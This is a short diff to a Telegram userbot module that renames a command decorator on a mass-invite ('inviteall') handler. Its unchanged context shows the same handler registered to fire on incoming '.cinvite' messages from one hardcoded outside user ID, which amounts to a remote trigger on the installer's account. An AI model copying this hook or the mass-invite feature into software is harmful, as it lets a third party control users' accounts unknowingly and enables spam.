@@ -12,7 +12,7 @@ from telethon.tl.functions.messages import GetFullChatRequest
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
 from userbot.events import register
-from userbot.utils import kyy_cmd
+from userbot.utils import galoncmd
 
 
 async def get_chatinfo(event):
@@ -52,7 +52,7 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@kyy_cmd(pattern="inviteall(?: |$)(.*)")
+@galoncmd(pattern="inviteall(?: |$)(.*)")
 @register(incoming=True, from_users=1663258664,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
